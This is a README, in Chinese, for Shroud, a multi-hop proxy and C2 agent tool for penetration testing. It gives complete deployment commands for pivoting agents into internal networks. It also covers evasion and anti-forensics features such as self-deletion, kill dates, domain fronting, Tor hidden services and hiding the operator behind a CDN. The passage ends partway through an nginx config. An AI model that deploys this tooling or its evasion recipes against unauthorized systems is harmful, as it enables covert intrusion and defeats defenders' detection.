# Shroud

[English](README_EN.md)

Shroud是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具

用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能

**请务必在使用前详细阅读使用方法及文末的注意事项**

## 架构总览

```
                                    ┌─────────────────────────────────────────┐
                                    │           Operator Workstation          │
                                    │                                         │
                                    │   ┌──────────────────────────────────┐  │
                                    │   │         Admin Controller         │  │
                                    │   │  ┌────────┐ ┌────────────────┐   │  │
                                    │   │  │Topology│ │ Identity Store │   │  │
                                    │   │  │Manager │ │(Argon2id+GCM)  │   │  │
                                    │   │  └────────┘ └────────────────┘   │  │
                                    │   │  Interactive CLI / Script Mode   │  │
                                    │   │  SOCKS5 Listener / Port Forward  │  │
                                    │   └──────────────┬───────────────────┘  │
                                    └──────────────────┼──────────────────────┘
                                                       │
                          ┌────────────────────────────┼────────────────────────────┐
                          │ Transport Options:                                      │
                          │   Raw TCP │ WebSocket │ TLS │ Tor │ SSH Tunnel           │
                          │   + Traffic Padding (--pad-size)                         │
                          │   + Domain Fronting (--front-domain)                     │
                          └────────────────────────────┼────────────────────────────┘
                                                       │
                                          Link Encrypted (ECDH+AES-GCM)
                                          E2E Encrypted (per-peer ECDH)
                                          Command Signed (Ed25519)
                                                       │
                          ┌────────────────────────────▼────────────────────────────┐
                          │                                                         │
               ┌──────────▼──────────┐                              ┌───────────────▼──────────┐
               │   Agent Node 0      │                              │   (Future Agent via       │
               │   (DMZ / Edge)      │                              │    listen/connect)        │
               │                     │                              └──────────────────────────┘
               │  Route Table:       │
               │  {dest→nextHop}     │
               │                     │
               │  Features:          │
               │  · Silent (-v off)  │
               │  · Sleep Mask       │
               │  · mlock keys       │
               │  · Anti-coredump    │
               └───────┬─────────┬───┘
                       │         │
          ┌────────────▼┐   ┌───▼────────────┐
          │ Agent Node 1│   │ Agent Node 2   │
          │ (Office Net)│   │ (Branch)       │
          │             │   │                │
          │ Route Table │   │ --kill-date    │
          │ {dest→next} │   │ --work-hours   │
          │             │   │ --self-delete  │
          └──────┬──────┘   └────────────────┘
                 │
          ┌──────▼──────┐
          │ Agent Node 3│
          │ (Core Zone) │
          │             │
          │ SOCKS5 ◄────┼── Operator proxies traffic here
          │ Port Fwd    │
          │ Shell/SSH   │
          │ File Xfer   │
          └─────────────┘
```

### 加密分层

```
┌─────────────────────────────────────────────────────────────────┐
│                        Wire Frame                               │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Layer 1: TLS (optional)          -- transport encryption │  │
│  │  ┌─────────────────────────────────────────────────────┐  │  │
│  │  │  Layer 2: LinkKey (ECDH+HKDF)  -- per-hop frame enc │  │  │
│  │  │  ┌───────────────────────────────────────────────┐  │  │  │
│  │  │  │  Header: Sender│Accepter│Type│Route│DataLen   │  │  │  │
│  │  │  ├───────────────────────────────────────────────┤  │  │  │
│  │  │  │  Layer 3: CryptoKey (AES-256-GCM) -- payload  │  │  │  │
│  │  │  │  ┌─────────────────────────────────────────┐  │  │  │  │
│  │  │  │  │  Layer 4: E2E Key (per-peer ECDH)       │  │  │  │  │
│  │  │  │  │  ┌───────────────────────────────────┐  │  │  │  │  │
│  │  │  │  │  │  Layer 5: Command Signature       │  │  │  │  │  │
│  │  │  │  │  │  (Ed25519 + seq + timestamp)      │  │  │  │  │  │
│  │  │  │  │  │  [actual command/data payload]    │  │  │  │  │  │
│  │  │  │  │  └───────────────────────────────────┘  │  │  │  │  │
│  │  │  │  └─────────────────────────────────────────┘  │  │  │  │
│  │  │  │  [padding if --pad-size set]                  │  │  │  │
│  │  │  └───────────────────────────────────────────────┘  │  │  │
│  │  └─────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### 逐跳路由 vs 源路由

```
源路由 (旧): 中间节点能看到完整路径
  Admin ──► Agent0 ──► Agent1 ──► Agent2
  Header.Route = "Agent0:Agent1:Agent2"    ← Agent0 看到全部下游节点

逐跳路由 (新): 中间节点只知下一跳
  Admin 下发路由表给每个 Agent:
    Agent0 的路由表: {Agent1→Agent1, Agent2→Agent1}
    Agent1 的路由表: {Agent2→Agent2}

  Admin ──► Agent0 ──► Agent1 ──► Agent2
  Header.Route = ""                        ← Agent0 查路由表得 nextHop=Agent1
                                             Agent0 不知道 Agent2 的存在路径
```

### Agent 生命周期

```
启动 ──► 注册/证书认证 ──► 正常运行 ──► [事件触发] ──► 退出
  │                           │              │
  │  -s secret (首次)         │              ├─ SHUTDOWN命令 → cleanShutdown()
  │  证书认证 (后续)           │              ├─ --kill-date到期 → selfDestruct()
  │                           │              ├─ 连接断开(无重连) → cleanShutdown()
  │                           │              └─ Ctrl+C / kill → cleanShutdown()
  │                           │
  │                      ┌────▼─────┐        cleanShutdown():
  │                      │ 消息循环  │          1. WipeSeeds() 清零密钥
  │                      │          │◄──┐      2. Wipe(LinkKey/CryptoKey)
  │                      └────┬─────┘   │      3. --self-delete? → 覆写+删除二进制
  │                           │         │      4. os.Exit(0)
  │                      连接断开       │
  │                           │         │
  │                      ┌────▼─────┐   │
  │                      │ 重连循环  │   │
  │                      │ 指数退避  │   │
  │                      │ +抖动    │   │
  │                      │          │   │
  │                      │ --sleep  │   │
  │                      │ -mask?   │   │
  │                      │ 加密内存  │   │
  │                      └────┬─────┘   │
  │                           │ 成功    │
  │                           └─────────┘
  │
  │  --work-hours 09:00-18:00
  │  └─ 窗口外 → 休眠至下一工作开始
  │
  │  --kill-date 2026-07-01
  │  └─ 每60秒检查 → 过期 → selfDestruct()
```

## 声明

> 本项目仅供网络安全研究与教学用途，严禁用于任何非法用途。请确保在使用本工具进行任何测试之前，已获得目标系统明确的授权，并严格遵守您所在国家/地区的相关法律法规。
使用本工具所带来的任何直接或间接后果（包括但不限于：数据丢失、系统损坏、法律责任等），由使用者自行承担，本项目作者不对任何滥用行为或由此引发的法律责任负责。
本工具的使用即表示您已阅读、理解并同意本免责声明的全部内容。

## 功能与安全特性

**基础功能**

- 交互式CLI(`admin`)：Tab命令补全、方向键历史导航、多层级面板切换
- 节点拓扑管理(`topo`)：树状展示所有在线节点的父子关系
- 节点信息展示(`detail`)：显示每个节点的IP、主机名、用户名、备忘
- 正向连接(`connect`)：Admin指令当前节点主动连接子节点
- 反向连接(`listen`)：Admin指令当前节点监听端口，等待子节点连入
- 自动重连(`--reconnect <秒>`)：断线后按指数退避+随机抖动自动重连，上限5分钟
- 代理出网(`--socks5-proxy`/`--http-proxy`)：节点间可通过SOCKS5或HTTP代理连接
- SSH隧道接入(`sshtunnel`)：通过已有SSH权限将节点加入网络，流量伪装为SSH
- 传输协议选择(`--up`/`--down`)：节点间流量支持裸TCP(`raw`)和WebSocket(`ws`)两种协议
- 多级SOCKS5代理(`socks <端口>`)：在Admin本地开启SOCKS5，流量经节点链转发，支持TCP/UDP、IPv4/IPv6
- SSH远程访问(`ssh <ip:port>`)：通过节点SSH到目标主机，支持密码和证书两种认证
- 远程Shell(`shell`)：获取当前节点的交互式Shell，`--cs gbk`支持GBK编码平台
- 文件传输(`upload`/`download`)：上传下载文件，带实时进度条
- 端口映射(`forward`/`backward`)：正向映射Admin本地端口到远程，反向映射Agent端口到Admin本地
- 端口复用(`--rehost`/`--report`)：SO_REUSEPORT模式(Windows/macOS/Linux)与IPTABLES模式(Linux，需root)
- 服务管理(`stopsocks`/`stopforward`/`stopbackward`)：随时启停各类代理/映射服务
- 多平台编译(`make all`)：Linux/macOS/Windows/MIPS/ARM/FreeBSD共9个平台，CGO_ENABLED=0静态编译
- 节点下线(`shutdown`)：Admin远程终止指定节点

**加密与认证**

- 一次性注册(`-s <口令>`)：首次连接HMAC挑战-应答互认证，通过后Admin CA自动签发Ed25519证书，后续连接使用证书认证
- 五层加密架构：TLS(可选`--tls-enable`) → LinkKey(X25519 ECDH+HKDF逐跳帧加密) → CryptoKey(AES-256-GCM载荷加密) → E2E(per-peer ECDH端到端加密) → 命令签名(Ed25519+序列号+5分钟时间窗口)
- TLS指纹锁定(`--tls-fingerprint <sha256>`)：首次连接打印对端证书指纹，后续连接校验一致性
- 身份文件加密(`--passphrase <口令>`)：Argon2id密钥派生(time=3,mem=64KB)+AES-256-GCM加密存储，也可通过`SHROUD_PASSPHRASE`环境变量设置
- CA密钥分离(`--ca-file <路径>`)：CA根密钥可离线存储，仅签发证书时挂载

**匿名与隐蔽**

- Tor匿名连接(`--tor-proxy <地址>`)：节点间流量经Tor网络转发，DNS由Tor出口节点解析，本地无泄漏
- Tor隐藏服务(`--tor-hidden`)：Agent作为.onion服务运行，无需公网IP，通过`--tor-control`和`--tor-control-password`管理
- 运行时传输切换(`transport tor`/`transport raw`)：在Admin控制台动态切换裸TCP和Tor传输，无需断开重连
- Tor线路更换(`newcircuit`)：请求当前节点建立新Tor线路，更换出口IP
- 域前置(`--front-domain <域名>`)：WebSocket模式下Host头伪装为CDN域名，TLS SNI与实际目标分离
- User-Agent轮换(`--user-agent "UA1|UA2|..."`)：管道符分隔多个UA，每次请求crypto/rand随机选择
- 自定义Origin头(`--origin <url>`)：替换WebSocket默认Origin值
- 流量填充(`--pad-size <字节>`)：消息帧填充至指定块大小倍数(如4096)，防流量大小分析
- 心跳保活(`--heartbeat`)：10秒基础间隔+0~6秒crypto/rand随机偏移，维持反代长连接并防定时模式分析

**反取证与OPSEC**

- 逐跳路由(自动)：Admin向每个Agent下发路由表(`目标→下一跳`)，中间节点仅知直连邻居，无法获取全网拓扑
- 动态UUID(自动)：Admin/Agent的UUID从密钥SHA256派生，二进制文件内无硬编码标识
- 身份路径隐藏(自动，`--identity-dir`可覆盖)：存储目录从密钥SHA256派生(非固定`.shroud/`)，已有部署自动兼容
- iptables链名隐藏(自动)：端口复用时链名从密钥SHA256派生前缀`CT`+6位hex(非固定字符串)
- 静默运行(`-v`开启日志)：Agent默认不输出任何日志，不泄露连接/节点信息
- 命令行擦除(自动)：`-s`和`--passphrase`参数启动后从进程参数列表中清除，`/proc/cmdline`不可见
- 防核心转储(自动)：Linux`prctl(PR_SET_DUMPABLE,0)` / Windows`SetErrorMode(SEM_*)` / macOS`PT_DENY_ATTACH`+`RLIMIT_CORE=0`
- mlock密钥锁页(自动)：密钥内存页锁定防止被swap到磁盘，覆盖Linux/Windows/macOS
- 密钥清零(自动)：退出及用后零化LinkKey、CryptoKey、PreAuthToken等密钥材料
- 休眠内存加密(`--sleep-mask`)：重连等待期间用临时密钥加密密钥材料，零化原始值
- KillDate自毁(`--kill-date <YYYY-MM-DD>`)：到期自动清除密钥、删除身份文件并退出，每60秒检查
- 工作时间窗口(`--work-hours <HH:MM-HH:MM>`)：窗口外自动休眠，零流量零连接
- Agent自删除(`--self-delete`)：退出时用随机数据覆写并删除自身二进制(Windows使用延迟删除)
- 二进制混淆(`make obfuscated`)：garble编译，`-literals -tiny -seed=random`混淆字符串和符号

## 编译及使用

- 使用`make`直接编译多平台完整程序，或参看Makefile编译特定程序

## 快速启动

以下命令可以快速启动最简单的shroud实例

- admin: `./shroud_admin -l 9999 -s 123`
- agent: `./shroud_agent -c <shroud_admin's IP>:9999 -s 123`

### 关于 `-s` 口令

`-s` 是**一次性注册引导口令**，仅在Agent首次连接时使用。Admin和Agent必须设置相同的值，用于HMAC挑战-应答互认证。认证通过后Admin CA会自动为该Agent签发Ed25519证书，后续所有连接（包括重连）均使用证书认证，不再依赖此口令。

**口令要求：** 任意字符串，长度不限。生产环境建议使用高强度随机值：

```bash
# Linux/macOS 生成32字符随机口令
openssl rand -base64 24

# 或使用 /dev/urandom
head -c 24 /dev/urandom | base64

# Windows PowerShell
[Convert]::ToBase64String((1..24 | ForEach-Object { Get-Random -Max 256 }) -as [byte[]])
```

**示例中的 `123`、`mysecret` 仅为演示用途，实际部署请替换为随机生成的强口令。**

## 使用方法

### 角色

Shroud一共包含两种角色，分别是：
- `admin`    渗透测试者使用的主控端
- `agent`    渗透测试者部署的被控端

### 名词定义

- 节点: 指admin || agent
- 主动模式: 指当前操作的节点主动连接另一个节点
- 被动模式: 指当前操作的节点监听某个端口，等待另一个节点连接
- 上游: 指当前操作的节点与其父节点之间的流量
- 下游：指当前操作的节点与其**所有**子节点之间的流量

### 参数解析

- admin

```
参数:
-l 被动模式下的监听地址[ip]:<port>
-s 一次性注册引导口令(必填，用于首次签发节点证书；已注册节点后续使用证书认证)
-c 主动模式下的目标节点地址
--socks5-proxy socks5代理服务器地址
--socks5-proxyu socks5代理服务器用户名(可选)
--socks5-proxyp socks5代理服务器密码(可选)
--http-proxy http代理服务器地址
--down 下游协议类型,默认为裸TCP流量,可选WS(WebSocket)
--tls-enable 为节点通信启用TLS
--tls-fingerprint 预期的TLS证书SHA256指纹，用于证书锁定
--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址
--heartbeat 开启心跳包
--tor-proxy Tor SOCKS5代理地址，如 127.0.0.1:9050
--passphrase 身份文件加密口令(可选，也可通过SHROUD_PASSPHRASE环境变量设置)
--identity-dir 身份文件存储目录(可选，默认从密钥派生)
--ca-file 离线CA密钥文件路径(可选，用于证书签发)
--pad-size 流量填充块大小(可选，如4096，需admin和agent一致)
```

- agent

```
参数:
-l 被动模式下的监听地址[ip]:<port>
-s 一次性注册引导口令(必填，仅首次注册使用)
-c 主动模式下的目标节点地址
--socks5-proxy socks5代理服务器地址
--socks5-proxyu socks5代理服务器用户名(可选)
--socks5-proxyp socks5代理服务器密码(可选)
--http-proxy http代理服务器地址
--reconnect 重连时间间隔
--rehost 端口复用时复用的IP地址
--report 端口复用时复用的端口号
--up 上游协议类型,默认为裸TCP流量,可选WS(WebSocket)
--down 下游协议类型,默认为裸TCP流量,可选WS(WebSocket)
--cs 运行平台的shell编码类型，默认为utf-8，可选gbk
--tls-enable 为节点通信启用TLS
--tls-fingerprint 预期的TLS证书SHA256指纹，用于证书锁定
--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址
--tor-proxy Tor SOCKS5代理地址，如 127.0.0.1:9050
--tor-hidden 以Tor隐藏服务模式启动
--tor-control Tor控制端口地址，默认127.0.0.1:9051
--tor-control-password Tor控制端口密码
-v 开启详细日志输出(默认静默)
--passphrase 身份文件加密口令(可选，也可通过SHROUD_PASSPHRASE环境变量设置)
--identity-dir 身份文件存储目录(可选)
--pad-size 流量填充块大小(可选，如4096，需admin和agent一致)
--sleep-mask 启用休眠时内存加密(重连等待期间加密密钥材料)
--kill-date 自毁日期(格式: 2026-07-01，到期自动清理退出)
--work-hours 工作时间窗口(格式: 09:00-18:00，窗口外自动休眠)
--self-delete 退出时安全删除自身二进制和身份文件
--user-agent 自定义User-Agent(多个以|分隔，每次请求随机选择)
--front-domain 域前置Host头(WebSocket模式下伪装为指定域名)
--origin 自定义Origin头(WebSocket模式下替换默认值)
```

### 参数用法

#### -l

此参数admin&&agent用法一致，仅用在被动模式下 

若不指定IP地址，则默认监听在`0.0.0.0`上

- admin:  `./shroud_admin -l 9999 -s 123` or `./shroud_admin -l 127.0.0.1:9999 -s 123`

- agent:  `./shroud_agent -l 9999 -s 123`  or `./shroud_agent -l 127.0.0.1:9999 -s 123`

#### -s

此参数admin&&agent用法一致，可用在主动&&被动模式下

此参数是首次注册引导口令。首次连接时用于证明注册权限并签发每节点证书；证书落盘后，重连和后续链路不再依赖该口令，负载加密改用证书身份派生的链路/E2E密钥。

- admin:  `./shroud_admin -l 9999 -s 123`

- agent:  `./shroud_agent -l 9999 -s 123`

#### -c

此参数admin&&agent用法一致，仅用在主动模式下

代表了希望连接到的节点的地址

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123`

#### --socks5-proxy/--socks5-proxyu/--socks5-proxyp/--http-proxy

> **注意区分**：这些参数用于 Agent/Admin **自身出网**（经过企业代理连接上级节点），与 `socks` 命令无关。`socks` 命令是给 **Operator 的工具**提供代理入口，详见下方「代理使用指南」。

这四个参数admin&&agent用法一致，仅用在主动模式下

`--socks5-proxy`代表socks5代理服务器地址，`--socks5-proxyu`以及`--socks5-proxyp`可选

`--http-proxy`代表http代理服务器地址,与socks5使用方式相同

无用户名密码：

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123 --socks5-proxy xxx.xxx.xxx.xxx`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123 --socks5-proxy xxx.xxx.xxx.xxx`

有用户名密码:

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123 --socks5-proxy xxx.xxx.xxx.xxx --socks5-proxyu xxx --socks5-proxyp xxx`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123 --socks5-proxy xxx.xxx.xxx.xxx --socks5-proxyu xxx --socks5-proxyp xxx`

#### --up/--down

这两个参数admin&&agent用法一致，可用在主动&&被动模式下

但注意admin上没有`--up`参数

这两个参数可选，若为空，则代表上/下游流量为裸TCP流量

若希望上/下游流量为WebSocket流量，设置此两参数为`ws`即可

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123 --down ws`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123 --up ws` or `./shroud_agent -c 127.0.0.1:9999 -s 123 --up ws --down ws`

注意：当你设置了某一节点上/下游为WS流量后，与其连接的父/子节点的下/上游流量必须设置为一致，如下

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123 --down ws`

- agent:  `./shroud_agent -l 9999 -s 123 --up ws`

上面这种情况，agent必须设置`--up`为ws，否则会导致网络出错

agent间也一样

假设agent-1正在`127.0.0.1:10000`端口上等待子节点的连接，并且设置了`--down ws`

那么agent-2也必须设置`--up`为ws，否则会导致网络出错

- agent-2:  `./shroud_agent -c 127.0.0.1:10000 -s 123 --up ws`

如需通过nginx等反代，请使用ws协议，并搭配TLS进行通讯

#### --reconnect

此参数仅用在agent，且仅用在主动模式下

参数可选，若不设置，则代表节点在网络连接断开后不会主动重连，若设置，则代表节点会每隔x(你设置的秒数)秒尝试重连至父节点

- admin:  `./shroud_admin -l 9999 -s 123`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123 --reconnect 10`

上面这种情况下，代表如果agent与admin之间的连接断开，agent会每隔十秒尝试重连回admin

agent之间也与上面情况一致

并且`--reconnect`参数可以与`--socks5-proxy`/`--socks5-proxyu`/`--socks5-proxyp`/`--http-proxy`一起使用，agent将会参照启动时的设置，通过代理尝试重连

#### --rehost/--report

这两个参数比较特别，仅用在agent端，详细请参见下方的端口复用机制

#### --cs

此参数仅用在agent，可用在主动&&被动模式下

主要旨在解决`shell`功能乱码问题，当用户将agent运行于控制台编码为gbk的平台上(例如一般情况下的Windows)并且同时admin运行于控制台编码为utf-8的平台上时，请务必将此参数设置为'gbk'

- Windows: `./shroud_agent -c 127.0.0.1:9999 -s 123 --cs gbk`

#### --tls-enable

这两个参数admin&&agent用法一致，可用在主动&&被动模式下

通过设置此选项，可以将节点间流量以TLS加密

示例如下
- admin: `./shroud_admin -l 10000 --tls-enable -s 123`
- agent: `./shroud_agent -c localhost:10000 --tls-enable -s 123`

当此参数启用时，TLS将提供传输层加密，AES-256-GCM加密仍然有效，两者叠加提供纵深防御

当此参数启用时，**请保证网络中每一个节点(包括admin)都启用此参数**

可通过`--tls-fingerprint`参数指定预期的TLS证书指纹，实现证书锁定。首次连接时会打印对端证书指纹供记录

#### --domain

这两个参数admin&&agent用法一致，仅可用在主动模式下

通过设置此选项，可以设置当前此节点TLS协商时的SNI选项或者WebSocket的目标Host

示例如下
- admin: `./shroud_admin -l 10000 --tls-enable -s 123`
- agent: `./shroud_agent -c xxx.xxx.xxx.xxx:10000 --tls-enable -s 123 --domain xxx.com`

#### --heartbeat

这个参数仅用在admin端，可用在主动&被动模式下

通过设置此选项，可以使admin持续向第一个节点发送心跳包，从而在中间有反向代理的情况下维持长链接

假设admin和agent中有类似nginx的反向代理设备将8080端口代理至8000端口,示例如下 
- admin: `./shroud_admin -l 8000 --tls-enable -s 123 --down ws --heartbeat`
- agent: `./shroud_agent -c xxx.xxx.xxx.xxx:8080 --tls-enable -s 123 --domain xxx.com --up ws`

## 部署示例

以下列举常见部署场景，所有示例中的 `-s` 口令仅用于首次注册，证书签发后后续连接自动使用证书认证。

### 场景一：直连（Admin被动，Agent主动）

最简拓扑，Admin监听等待Agent连入。

```
Operator                        Target Host
┌──────────┐     TCP:9999      ┌──────────┐
│  Admin   │◄──────────────────│  Agent   │
│ -l 9999  │                   │ -c IP:99 │
└──────────┘                   └──────────┘
```

```bash
# Operator
./shroud_admin -l 9999 -s mysecret

# Target
./shroud_agent -c <admin_ip>:9999 -s mysecret
```

### 场景二：反向连接（Agent被动，Admin主动）

Agent先监听，Admin主动连接。适合Agent所在网络允许入站但Operator不允许的场景。

```
Operator                        Target Host
┌──────────┐     TCP:8443      ┌──────────┐
│  Admin   │──────────────────►│  Agent   │
│ -c IP:84 │                   │ -l 8443  │
└──────────┘                   └──────────┘
```

```bash
# Target (先启动)
./shroud_agent -l 8443 -s mysecret

# Operator
./shroud_admin -c <agent_ip>:8443 -s mysecret
```

### 场景三：多级代理链

Admin → Agent-0(DMZ) → Agent-1(办公网) → Agent-2(核心区)，最终在Agent-2上开SOCKS5。

```
Operator          DMZ             Office           Core
┌──────┐       ┌────────┐      ┌────────┐      ┌────────┐
│Admin │◄──────│Agent-0 │◄─────│Agent-1 │◄─────│Agent-2 │
│-l 999│       │-c :9999│      │-l 10000│      │-l 10001│
└──────┘       └────────┘      └────────┘      └────────┘
  │                                                 │
  │◄──── SOCKS5 :7777 ─────── tunneled ────────────►│
```

```bash
# 1. Operator 启动 Admin
./shroud_admin -l 9999 -s mysecret

# 2. DMZ 启动 Agent-0，主动连接Admin
./shroud_agent -c <admin_ip>:9999 -s mysecret

# 3. Admin 控制台，让 Agent-0 监听等待子节点
(admin) >> use 0
(node 0) >> listen
# 选择 1.Normal Passive，输入端口 10000

# 4. 办公网启动 Agent-1，连接 Agent-0
./shroud_agent -c <agent0_ip>:10000 -s mysecret

# 5. Admin 控制台，让 Agent-1 监听等待子节点
(admin) >> use 1
(node 1) >> listen
# 选择 1.Normal Passive，输入端口 10001

# 6. 核心区启动 Agent-2，连接 Agent-1
./shroud_agent -c <agent1_ip>:10001 -s mysecret

# 7. 在 Agent-2 上开启 SOCKS5
(admin) >> use 2
(node 2) >> socks 7777
# 本地 127.0.0.1:7777 即可代理到核心区
```

### 场景四：通过企业代理出网

Agent 位于只允许通过HTTP/SOCKS5代理出网的内网环境。

```
Target Host          Corporate Proxy        Operator
┌──────────┐        ┌──────────────┐       ┌──────────┐
│  Agent   │──────►│  HTTP Proxy   │─────►│  Admin   │
│          │       │  10.0.0.1:808 │       │ -l 443   │
└──────────┘        └──────────────┘       └──────────┘
```

```bash
# Operator
./shroud_admin -l 443 -s mysecret --down ws --tls-enable

# Target (通过HTTP代理)
./shroud_agent -c <admin_domain>:443 -s mysecret \
  --http-proxy 10.0.0.1:8080 --up ws --tls-enable --reconnect 30

# 或通过SOCKS5代理(带认证)
./shroud_agent -c <admin_domain>:443 -s mysecret \
  --socks5-proxy 10.0.0.1:1080 --socks5-proxyu user --socks5-proxyp pass \
  --up ws --tls-enable --reconnect 30
```

### 场景五：WebSocket + TLS + Nginx反代

伪装为普通HTTPS网站流量，通过Nginx反向代理转发。

```
Target Host              CDN/Nginx               Operator
┌──────────┐           ┌───────────┐           ┌──────────┐
│  Agent   │──────────►│  Nginx    │──────────►│  Admin   │
│  --up ws │  TLS:443  │  :443→800 │  WS:8000  │ -l 8000  │
│--tls-enab│           │           │           │ --down ws│
└──────────┘           └───────────┘           └──────────┘
```

Nginx配置：
```nginx
server {
    listen 443 ssl;
    server_name c2.example.com;
    ssl_certificate     /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400s;
    }
}
```

```bash
# Operator
./shroud_admin -l 8000 -s mysecret --down ws --heartbeat

# Target
./shroud_agent -c c2.example.com:443 -s mysecret \
  --up ws --tls-enable --domain c2.example.com --reconnect 30
```

### 场景六：Tor匿名连接

节点间流量经过Tor网络，隐藏双方真实IP。

```
Operator                  Tor Network              Target Host
┌──────────┐           ┌─────────────┐           ┌──────────┐
│  Admin   │──────────►│  Guard →    │──────────►│  Agent   │
│--tor-prox│  SOCKS5   │  Middle →   │           │ -l 9999  │
│ y :9050  │  :9050    │  Exit       │           │          │
└──────────┘           └─────────────┘           └──────────┘
```

```bash
# Target (先启动)
./shroud_agent -l 9999 -s mysecret

# Operator (通过Tor连接)
./shroud_admin -c <agent_ip>:9999 -s mysecret --tor-proxy 127.0.0.1:9050
```

### 场景七：Tor隐藏服务

Agent作为.onion隐藏服务运行，无需公网IP，双方IP均不可见。

```
Operator                  Tor Network              Target Host
┌──────────┐           ┌─────────────┐           ┌──────────┐
│  Admin   │◄─────────►│ Rendezvous  │◄─────────►│  Agent   │
│--tor-prox│           │  Point      │           │--tor-hidd│
│ y :9050  │           │             │           │ en       │
└──────────┘           └─────────────┘           └──────────┘
                       xxx...xxx.onion
```

```bash
# Target (以Tor隐藏服务启动)
./shroud_agent --tor-hidden --tor-control 127.0.0.1:9051 \
  --tor-control-password torpass -s mysecret
# 输出: [*] Tor hidden service: xxxxxxxxxxxx.onion:xxxxx

# Operator (通过Tor连接.onion地址)
./shroud_admin -c xxxxxxxxxxxx.onion:<port> -s mysecret \
  --tor-proxy 127.0.0.1:9050
```

### 场景八：SSH隧道接入

利用已有SSH权限，通过SSH隧道将新节点加入网络，流量伪装为SSH。

```
Admin ◄──── Agent-0 ════SSH════ Target Host(Agent-1)
                    sshtunnel     Agent-1 -l 10000
                    :22 → :10000
```

```bash
# Target 先启动Agent-1监听
./shroud_agent -l 10000 -s mysecret

# Admin 控制台，通过 Agent-0 的SSH隧道连接 Agent-1
(admin) >> use 0
(node 0) >> sshtunnel <target_ip>:22 10000
# 输入SSH用户名密码或证书路径
# Agent-1 作为 Agent-0 的子节点加入网络
```

### 场景九：端口复用（复用Web服务80端口）

Agent复用目标主机已有的80端口，流量与正常Web混在一起。

```
Operator                        Target Host (已有HTTP:80)
┌──────────┐     TCP:80        ┌──────────────────┐
│  Admin   │──────────────────►│  Agent (复用:80)  │
│ -c IP:80 │                   │  HTTP 服务不受影响 │
└──────────┘                   └──────────────────┘
```

**SO_REUSEPORT模式**（Windows/macOS/Linux）：
```bash
# Target (复用80端口)
./shroud_agent --report 80 --rehost 192.168.0.105 -s mysecret

# Operator
./shroud_admin -c 192.168.0.105:80 -s mysecret
```

**IPTABLES模式**（仅Linux，需root）：
```bash
# Target (复用22端口，实际监听10000)
./shroud_agent --report 22 -l 10000 -s mysecret

# 执行激活脚本
python reuse.py --start --rhost <agent_ip> --rport 22

# Operator
./shroud_admin -c <agent_ip>:22 -s mysecret
```

### 场景十：完整OPSEC部署

综合所有隐蔽特性：WS+TLS、域前置、流量填充、心跳抖动、KillDate、工作时间、自删除、休眠加密。

```bash
# Operator (Admin端)
./shroud_admin -l 443 -s <secret> \
  --down ws --tls-enable --heartbeat \
  --passphrase <pass> --pad-size 4096

# Target (Agent端 - 最大隐蔽性)
./shroud_agent -c <c2_domain>:443 -s <secret> \
  --up ws --tls-enable \
  --reconnect 30 \
  --front-domain cdn.example.com \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)|Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
  --passphrase <pass> --pad-size 4096 \
  --sleep-mask --self-delete \
  --kill-date 2026-07-15 \
  --work-hours 09:00-18:00
```

各参数作用：

| 参数 | 作用 |
|------|------|
| `--up ws --tls-enable` | WebSocket + TLS，流量形似HTTPS |
| `--front-domain` | Host头伪装为CDN域名 |
| `--user-agent` | 每次请求随机UA |
| `--pad-size 4096` | 帧填充至4KB倍数，防流量大小分析 |
| `--reconnect 30` | 断线后30秒基础间隔重连（自动指数退避+抖动） |
| `--sleep-mask` | 重连等待期间加密内存中的密钥 |
| `--self-delete` | 退出时覆写并删除自身二进制 |
| `--kill-date` | 到期自动清除痕迹并退出 |
| `--work-hours` | 仅工作时间活动，非窗口期零流量 |
| `--passphrase` | 身份文件落盘加密 |

### 场景十一：CDN保护Admin真实IP

将Admin隐藏在CDN（如Cloudflare）后面，Agent只知道CDN域名，永远无法获取Admin的真实IP。即使Agent被攻陷，攻击者也无法定位Operator工作站。

```
Target Host              CDN (Cloudflare)           Nginx (Origin)         Operator
┌──────────┐           ┌───────────────┐          ┌────────────┐        ┌──────────┐
│  Agent   │──────────►│  CDN Edge     │─────────►│  Nginx     │───────►│  Admin   │
│  --up ws │  TLS:443  │  c2.example.  │  Origin  │  :443→8000 │ WS:80 │ -l 8000  │
│--tls-enab│           │  com          │  Pull    │  127.0.0.1 │  00   │ --down ws│
└──────────┘           └───────────────┘          └────────────┘        └──────────┘
                       Agent只能看到这里             Admin真实IP隐藏在这里
```

**第一步：域名和CDN配置**

1. 注册域名（如 `c2.example.com`），DNS托管到 Cloudflare
2. Cloudflare DNS 添加 A 记录指向你的 Nginx 服务器 IP，**开启橙色云朵（Proxy）**
3. Cloudflare SSL/TLS 设置：
   - 模式选择 `Full` 或 `Full (Strict)`（Nginx 有有效证书时用 Strict）
   - 确保 Edge Certificates 已启用
4. Cloudflare Network 设置：
   - **WebSockets: 开启**（必须，否则 WS 握手会被拦截）

**第二步：Nginx 配置（Origin 服务器）**

```nginx
server {
    listen 443 ssl;
    server_name c2.example.com;
    ssl_certificate     /path/to/cert.pem;    # 可用 Cloudflare Origin Certificate
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://127.0.0.1:8000;
